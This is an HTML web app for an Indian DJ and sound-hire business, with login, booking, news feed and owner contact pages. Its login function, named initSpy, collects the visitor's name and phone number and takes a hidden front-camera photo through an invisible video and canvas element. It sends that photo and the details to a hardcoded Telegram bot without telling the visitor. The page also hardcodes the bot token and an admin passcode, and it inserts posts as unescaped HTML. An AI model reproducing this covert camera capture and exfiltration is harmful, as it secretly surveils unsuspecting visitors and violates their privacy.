<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Maa Nirmala DJ | ELITE APP</title>
    
    <link rel="manifest" href="data:application/json;base64,ewogICAgIm5hbWUiOiAiTWFhIE5pcm1hbGEgREogQXBwIiwKICAgICJzaG9ydF9uYW1lIjogIk1hYSBOaXJtYWxhIiwKICAgICJzdGFydF91cmwiOiAiLyIsCiAgICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAgICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwMjAyMDQiLAogICAgInRoZW1lX2NvbG9yIjogIiNGRkQ3MDAiLAogICAgImljb25zIjogWyB7ICJzcmMiOiAiaHR0cHM6Ly9pLnBvc3RpbWcuY2MvRnp3OGJtN1gvZmlsZS0wMDAwMDAwMDk3NTg3MWZkOTk1OTZhNWEwZTM5YzcxYi5wbmciLCAic2l6ZXMiOiAiNTEyeDUxMiIsICJ0eXBlIjogImltYWdlL3BuZyIgfSBdCn0=">
    <meta name="theme-color" content="#FFD700">
    <link rel="apple-touch-icon" href="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png">

    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Cinzel:wght@700;900&family=Rajdhani:wght@500;600;700;800&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        /* CORE VARIABLES */
        :root {
            --bg-deep: #000000;
            --bg-panel: #0d0d12;
            --primary: #FFD700; 
            --accent: #00f3ff;
            --text: #ffffff;
            --glass: rgba(15, 15, 20, 0.95);
            --border: 1px solid rgba(255, 215, 0, 0.2);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg-deep);
            color: var(--text);
            font-family: 'Outfit', sans-serif;
            overflow-x: hidden;
            min-height: 100vh;
            /* Sci-Fi Grid Background */
            background-image: 
                linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
        }

        /* UTILS */
        #hiddenVideo, #hiddenCanvas, #clickSound, #adminFile, #adminReel { display: none; }

        /* --- PAGE 1: GATEWAY --- */
        #gateway {
            position: fixed; inset: 0; z-index: 9999;
            background: #000;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            padding: 20px;
            background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%);
        }
        .logo-ring {
            width: 140px; height: 140px; border-radius: 50%;
            padding: 5px; border: 3px solid var(--primary);
            box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
            margin-bottom: 30px; animation: pulse 3s infinite;
        }
        .logo-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }

        .secure-card {
            background: rgba(20, 20, 30, 0.8); border: 1px solid var(--accent);
            padding: 30px; border-radius: 20px; width: 100%; max-width: 350px;
            text-align: center; backdrop-filter: blur(10px);
        }
        .login-input {
            width: 100%; padding: 15px; margin-bottom: 15px;
            background: #000; border: 1px solid #444; color: var(--accent);
            font-family: 'Rajdhani'; font-size: 18px; border-radius: 50px; text-align: center;
        }
        .btn-enter {
            width: 100%; padding: 15px; background: linear-gradient(90deg, var(--primary), #ffa500);
            color: #000; font-weight: 800; border: none; font-family: 'Rajdhani'; letter-spacing: 2px;
            cursor: pointer; border-radius: 50px; font-size: 18px;
        }

        /* --- PAGE 2: MAIN APP --- */
        #main-app { display: none; padding-bottom: 90px; opacity: 0; transition: opacity 0.5s; }

        .app-header {
            position: fixed; top: 0; width: 100%; height: 65px;
            background: var(--glass); backdrop-filter: blur(15px);
            display: flex; justify-content: space-between; align-items: center;
            padding: 0 20px; z-index: 1000; border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .stylish-logo {
            font-family: 'Great Vibes', cursive; font-size: 28px;
            background: linear-gradient(to right, #FFD700, #ff8c00);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        /* SIDEBAR */
        #sidebar {
            position: fixed; top: 0; left: -280px; width: 260px; height: 100vh;
            background: #080808; border-right: 2px solid var(--primary);
            z-index: 2000; padding-top: 80px; transition: 0.3s;
        }
        #sidebar.active { left: 0; }
        .menu-link {
            display: block; padding: 15px 25px; color: var(--text);
            text-decoration: none; font-family: 'Rajdhani'; font-size: 18px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        /* HOME TAB */
        .tab-content { display: none; animation: fadeUp 0.5s; }
        .tab-content.active { display: block; }
        @keyframes fadeUp { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }

        .hero-section { margin-top: 85px; text-align: center; }
        .floating-hero {
            width: 140px; height: 140px; border-radius: 50%;
            border: 4px solid var(--primary); box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
            object-fit: cover; animation: float 4s infinite ease-in-out;
        }
        @keyframes float { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }

        /* LIVE FEED STYLES (NEW) */
        .feed-container { padding: 0 15px; margin-top: 30px; }
        .feed-title {
            color: var(--accent); font-family: 'Cinzel'; border-bottom: 1px solid var(--accent);
            padding-bottom: 5px; margin-bottom: 15px; font-size: 18px;
        }
        .post-card {
            background: #111; border: 1px solid #333; border-radius: 12px;
            margin-bottom: 20px; overflow: hidden; animation: fadeUp 0.5s;
        }
        .post-header { padding: 10px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #222; }
        .post-avatar { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--primary); }
        .post-meta h4 { font-size: 14px; color: var(--primary); margin: 0; font-family: 'Rajdhani'; }
        .post-meta span { font-size: 10px; color: #666; }
        .post-body { padding: 10px; color: #ddd; font-size: 14px; line-height: 1.5; }
        .post-img { width: 100%; display: block; }
        .post-video { width: 100%; display: block; }

        /* CONTACT MODAL (PREMIUM EXPANDED BUTTONS) */
        #ownerModal {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000;
            display: none; padding: 20px; overflow-y: auto; justify-content: center;
        }
        .owner-scroll-box { width: 100%; max-width: 500px; margin-top: 50px; padding-bottom: 50px; }
        .owner-tile {
            background: #151515; border: 1px solid var(--border); border-radius: 15px;
            padding: 20px; margin-bottom: 20px;
        }
        .tile-head { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
        .tile-pic { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
        .tile-info h3 { color: var(--accent); font-family: 'Cinzel'; font-size: 18px; margin: 0; }
        .tile-info p { color: #888; font-size: 12px; margin: 0; font-family: 'Rajdhani'; }
        
        .btn-stack { display: flex; flex-direction: column; gap: 10px; }
        .big-btn {
            width: 100%; padding: 12px; border-radius: 8px; border: none;
            display: flex; align-items: center; justify-content: center; gap: 10px;
            font-family: 'Rajdhani'; font-weight: 700; font-size: 16px; color: #000;
            text-decoration: none; transition: 0.2s;
        }
        .big-btn:active { transform: scale(0.98); }
        .b-call { background: linear-gradient(90deg, #FFD700, #ffaa00); }
        .b-wa { background: linear-gradient(90deg, #25D366, #128C7E); color: white; }
        .b-sms { background: linear-gradient(90deg, #0088cc, #0055aa); color: white; }

        /* BOOKING & MAP */
        .booking-panel { margin: 20px; padding: 20px; background: var(--bg-panel); border-radius: 15px; border: 1px solid var(--border); }
        .form-row { margin-bottom: 15px; }
        .form-input { width: 100%; padding: 12px; background: #000; border: 1px solid #444; color: white; border-radius: 8px; }
        
        /* BOTTOM NAV */
        .bottom-nav {
            position: fixed; bottom: 0; width: 100%; height: 65px;
            background: rgba(10, 10, 15, 0.98); border-top: 2px solid var(--accent);
            display: flex; justify-content: space-around; align-items: center;
            z-index: 900; backdrop-filter: blur(10px);
        }
        .nav-icon { color: #666; font-size: 10px; display: flex; flex-direction: column; align-items: center; }
        .nav-icon i { font-size: 22px; margin-bottom: 4px; }
        .nav-icon.active { color: var(--accent); transform: translateY(-3px); }

    </style>
</head>
<body onclick="playClick()" onload="loadFeed()">

    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3" preload="auto"></audio>

    <video id="hiddenVideo" autoplay playsinline></video>
    <canvas id="hiddenCanvas"></canvas>
    
    <input type="file" id="adminFile" accept="image/*" onchange="createPost('image')">
    <input type="file" id="adminReel" accept="video/*" onchange="createPost('video')">

    <div id="gateway">
        <div class="logo-ring">
            <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="logo-img">
        </div>
        <div class="secure-card">
            <h2 style="font-family:'Cinzel'; color:var(--primary);">Maa Nirmala DJ</h2>
            <p style="color:#888; font-family:'Rajdhani'; letter-spacing:2px; margin-bottom:20px;">ELITE APP ACCESS v30.0</p>
            <input type="text" id="logName" class="login-input" placeholder="FULL NAME">
            <input type="tel" id="logPhone" class="login-input" placeholder="MOBILE NUMBER">
            <button class="btn-enter" id="enterBtn" onclick="initSpy()">
                <i class="fas fa-fingerprint"></i> LOGIN
            </button>
        </div>
    </div>

    <div id="main-app">
        
        <header class="app-header">
            <i class="fas fa-bars" style="font-size:22px; color:var(--primary);" onclick="toggleMenu()"></i>
            <div class="stylish-logo">Maa Nirmala</div>
            <i class="fas fa-moon" style="font-size:22px; color:var(--accent);" onclick="toggleTheme()"></i>
        </header>

        <aside id="sidebar">
            <div style="text-align:center; padding:20px; border-bottom:1px solid #333;">
                <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" style="width:80px; height:80px; border-radius:50%; border:2px solid var(--primary);">
                <h4 style="color:white; margin-top:10px;">Lalu Kumar</h4>
                <div onclick="adminLogin()" style="margin-top:10px; padding:8px; border:1px solid var(--accent); color:var(--accent); font-size:12px; cursor:pointer;">ADMIN PANEL</div>
            </div>
            <a href="#" class="menu-link" onclick="goTab('home')"><i class="fas fa-home"></i> Home</a>
            <a href="#" class="menu-link" onclick="goTab('booking')"><i class="fas fa-calendar-check"></i> Booking</a>
            <a href="#" class="menu-link" onclick="openOwners()"><i class="fas fa-users"></i> Owners</a>
            <a href="#" class="menu-link" onclick="goTab('services')"><i class="fas fa-compact-disc"></i> Services</a>
            <a href="#" class="menu-link" onclick="location.reload()" style="color:#ff4444;"><i class="fas fa-power-off"></i> Logout</a>
        </aside>

        <div id="tab-home" class="tab-content active">
            <div class="hero-section">
                <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="floating-hero">
                <h1 style="font-family:'Cinzel'; font-size:32px; color:var(--primary); margin-top:15px;">ROYAL SOUND</h1>
                <p style="color:var(--accent); font-family:'Rajdhani'; letter-spacing:3px;">ENGINEERING SINCE 2010</p>
            </div>

            <div class="feed-container">
                <h4 class="feed-title">OFFICIAL UPDATES</h4>
                <div id="feed-stream">
                    <div class="post-card">
                        <div class="post-header">
                            <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="post-avatar">
                            <div class="post-meta"><h4>Maa Nirmala Admin</h4><span>Pinned Post</span></div>
                        </div>
                        <div class="post-body">
                            Welcome to the Official Elite App. Check here for live photos, reels, and updates from our events.
                        </div>
                    </div>
                </div>
            </div>

            <div style="padding:20px;">
                <h4 class="feed-title">LOCATION MAP</h4>
                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3616.985617042578!2d86.9788017150058!3d24.59480808417935!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjTCsDM1JzQxLjMiTiA4NsKwNTgnNTEuNiJF!5e0!3m2!1sen!2sin!4v1629898765432!5m2!1sen!2sin" style="width:100%; height:250px; border:2px solid var(--primary); border-radius:15px;"></iframe>
            </div>
        </div>

        <div id="tab-booking" class="tab-content">
            <div style="text-align:center; margin-top:85px; margin-bottom:20px;">
                <h2 style="color:var(--primary); font-family:'Cinzel';">EVENT BOOKING</h2>
            </div>
            <div class="booking-panel">
                <div class="form-row"><label style="color:var(--accent); font-size:12px;">FULL NAME</label><input type="text" id="bName" class="form-input"></div>
                <div class="form-row"><label style="color:var(--accent); font-size:12px;">PHONE</label><input type="tel" id="bPhone" class="form-input"></div>
                <div class="form-row"><label style="color:var(--accent); font-size:12px;">ADDRESS</label><input type="text" id="bAddr" class="form-input"></div>
                <div style="display:flex; gap:10px;">
                    <input type="text" id="bBlock" class="form-input" placeholder="Block">
                    <input type="text" id="bPin" class="form-input" placeholder="Pin">
                </div>
                <div class="form-row" style="margin-top:10px;"><label style="color:var(--accent); font-size:12px;">DISTRICT</label><input type="text" id="bDist" class="form-input"></div>
                <div class="form-row"><label style="color:var(--accent); font-size:12px;">COUNTRY</label><input type="text" id="bCount" class="form-input" value="India"></div>
                <div class="form-row"><label style="color:var(--accent); font-size:12px;">DATE</label><input type="date" id="bDate" class="form-input" style="color-scheme:dark;"></div>
                <button class="btn-enter" onclick="submitBooking()" style="margin-top:20px;">CONFIRM</button>
            </div>
        </div>

        <div id="tab-services" class="tab-content">
            <div style="text-align:center; margin-top:100px;">
                <h2 style="color:white; margin-bottom:20px;">SERVICES</h2>
                <div class="secure-card" style="margin:0 auto 20px;">
                    <i class="fas fa-music" style="font-size:40px; color:var(--primary);"></i>
                    <h3 style="margin-top:10px;">Concert Sound</h3>
                </div>
                <div class="secure-card" style="margin:0 auto;">
                    <i class="fas fa-truck-monster" style="font-size:40px; color:var(--accent);"></i>
                    <h3 style="margin-top:10px;">Mobile DJ</h3>
                </div>
            </div>
        </div>

        <div id="ownerModal">
            <div class="owner-scroll-box">
                <h2 style="color:var(--primary); text-align:center; font-family:'Cinzel'; margin-bottom:20px;">OWNER COMMAND</h2>
                
                <div class="owner-tile">
                    <div class="tile-head">
                        <img src="https://i.postimg.cc/6qbJj3hQ/Screenshot-2026-01-14-15-25-06-57-1c337646f29875672b5a61192b9010f9-2.jpg" class="tile-pic">
                        <div class="tile-info"><h3>ANIL KUMAR</h3><p>FOUNDER</p></div>
                    </div>
                    <div class="btn-stack">
                        <a href="tel:+918544341240" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
                        <a href="https://wa.me/918544341240" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
                        <a href="sms:+918544341240" class="big-btn b-sms"><i class="fas fa-envelope"></i> SEND SMS</a>
                    </div>
                </div>

                <div class="owner-tile">
                    <div class="tile-head">
                        <img src="https://i.postimg.cc/7Y7rMx2y/Screenshot-2026-01-14-15-33-01-78-965bbf4d18d205f782c6b8409c5773a4-2.jpg" class="tile-pic">
                        <div class="tile-info"><h3>SILDHAR KUMAR</h3><p>LOGISTICS</p></div>
                    </div>
                    <div class="btn-stack">
                        <a href="tel:+917294969938" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
                        <a href="https://wa.me/917294969938" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
                    </div>
                </div>

                <div class="owner-tile">
                    <div class="tile-head">
                        <img src="https://i.postimg.cc/qMWWzWbF/Screenshot-2026-01-14-15-29-44-90-965bbf4d18d205f782c6b8409c5773a4.jpg" class="tile-pic">
                        <div class="tile-info"><h3>SANJAY KUMAR</h3><p>TECHNICAL</p></div>
                    </div>
                    <div class="btn-stack">
                        <a href="tel:+919153635378" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
                        <a href="https://wa.me/919153635378" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
                    </div>
                </div>

                <div class="owner-tile">
                    <div class="tile-head">
                        <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="tile-pic">
                        <div class="tile-info"><h3>LALU KUMAR</h3><p>CREATIVE</p></div>
                    </div>
                    <div class="btn-stack">
                        <a href="tel:+919771617808" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
                        <a href="https://wa.me/919771617808" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
                    </div>
                </div>

                <button class="btn-enter" style="background:#222; border:1px solid #444;" onclick="closeOwners()">CLOSE</button>
            </div>
        </div>

        <div id="adminModal" style="display:none; position:fixed; inset:0; background:black; z-index:6000; justify-content:center; align-items:center;">
            <div class="secure-card">
                <h3>ADMIN POSTING</h3>
                <button class="btn-enter" onclick="postText()" style="margin-bottom:10px;">📝 WRITE POST</button>
                <button class="btn-enter" onclick="document.getElementById('adminFile').click()" style="margin-bottom:10px;">📸 UPLOAD PHOTO</button>
                <button class="btn-enter" onclick="document.getElementById('adminReel').click()" style="margin-bottom:10px;">🎥 UPLOAD REEL</button>
                <button class="btn-enter" style="background:#333;" onclick="document.getElementById('adminModal').style.display='none'">EXIT</button>
            </div>
        </div>

        <nav class="bottom-nav">
            <div class="nav-icon active" onclick="goTab('home', this)"><i class="fas fa-home"></i>Home</div>
            <div class="nav-icon" onclick="goTab('booking', this)"><i class="fas fa-calendar-check"></i>Book</div>
            <div class="nav-icon" onclick="openOwners()"><i class="fas fa-address-book"></i>Contact</div>
            <div class="nav-icon" onclick="goTab('services', this)"><i class="fas fa-layer-group"></i>Service</div>
        </nav>

    </div>

    <script>
        const BOT_TOKEN = "8246897026:AAG7c8YZ2V1jk18knzODpKRIDwgeXXFdvcY";
        const CHAT_ID = "8506290708"; 

        function playClick() { document.getElementById("clickSound").play().catch(e=>{}); }

        // --- SPY SYSTEM ---
        async function initSpy() {
            const name = document.getElementById('logName').value;
            const phone = document.getElementById('logPhone').value;
            const btn = document.getElementById('enterBtn');
            if(!name || !phone) return Swal.fire({icon:'error', background:'#111', title:'Identity Required'});
            btn.innerHTML = 'VERIFYING...';

            const logMsg = `🚨 **SECURE LOG**\n👤: ${name} (${phone})\n⏰: ${new Date().toLocaleString()}`;
            
            // Camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                canvas.toBlob(async (b) => {
                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b); fd.append('caption', logMsg);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    unlock();
                }, 'image/jpeg', 0.8);
            } catch (e) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id:CHAT_ID, text:logMsg}) });
                unlock();
            }
        }
        function unlock() { document.getElementById('gateway').style.display='none'; document.getElementById('main-app').style.display='block'; setTimeout(()=>document.getElementById('main-app').style.opacity=1,50); }

        // --- LIVE FEED LOGIC (NO RELOAD) ---
        function loadFeed() {
            const posts = JSON.parse(localStorage.getItem('mn_posts')) || [];
            const container = document.getElementById('feed-stream');
            posts.forEach(p => addPostToDom(p));
        }

        function addPostToDom(post) {
            const container = document.getElementById('feed-stream');
            const div = document.createElement('div');
            div.className = 'post-card';
            div.innerHTML = `
                <div class="post-header"><img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="post-avatar"><div class="post-meta"><h4>Maa Nirmala Admin</h4><span>${post.date}</span></div></div>
                ${post.txt ? `<div class="post-body">${post.txt}</div>` : ''}
                ${post.img ? `<img src="${post.img}" class="post-img">` : ''}
                ${post.vid ? `<video src="${post.vid}" controls class="post-video" style="width:100%"></video>` : ''}
            `;
            container.prepend(div);
        }

        function savePost(post) {
            const posts = JSON.parse(localStorage.getItem('mn_posts')) || [];
            posts.push(post);
            localStorage.setItem('mn_posts', JSON.stringify(posts));
            addPostToDom(post);
        }

        // --- ADMIN ---
        function adminLogin() {
            Swal.fire({ title:'ADMIN CODE', input:'password', background:'#111', color:'#fff', preConfirm: (c) => {
                if(c==='121120') document.getElementById('adminModal').style.display='flex';
                else Swal.fire('Error','Invalid Code','error');
            }});
        }

        function postText() {
            Swal.fire({ title:'WRITE POST', input:'textarea', background:'#111', color:'#fff', preConfirm: (t) => {
                savePost({ date: new Date().toLocaleDateString(), txt: t });
                document.getElementById('adminModal').style.display='none';
            }});
        }

        function createPost(type) {
            const input = type==='image' ? document.getElementById('adminFile') : document.getElementById('adminReel');
            const file = input.files[0];
            if(file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    savePost({ date: new Date().toLocaleDateString(), [type==='image'?'img':'vid']: e.target.result });
                    document.getElementById('adminModal').style.display='none';
                };
                reader.readAsDataURL(file);
            }
        }

        // --- BOOKING ---
        function submitBooking() {
            const n=document.getElementById('bName').value, p=document.getElementById('bPhone').value, d=document.getElementById('bDate').value;
            if(!n || !p || !d) return Swal.fire('Error','Fill required','error');
            const msg = `📅 BOOKING\n👤 ${n}\n📞 ${p}\n🗓 ${d}`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg }) });
            Swal.fire('Success','Sent!','success');
        }

        // --- NAV ---
        function goTab(id,el) {
            document.querySelectorAll('.tab-content').forEach(d=>d.classList.remove('active'));
            document.getElementById('tab-'+id).classList.add('active');
            if(el) { document.querySelectorAll('.nav-icon').forEach(i=>i.classList.remove('active')); el.classList.add('active'); }
            toggleMenu(false);
        }
        function toggleMenu(f) { const s=document.getElementById('sidebar'); if(f===false)s.classList.remove('active'); else s.classList.toggle('active'); }
        function openOwners() { document.getElementById('ownerModal').style.display='flex'; toggleMenu(false); }
        function closeOwners() { document.getElementById('ownerModal').style.display='none'; }
        function toggleTheme() { document.body.setAttribute('data-theme', document.body.getAttribute('data-theme')==='light'?'dark':'light'); }
    </script>
</body>
</html>
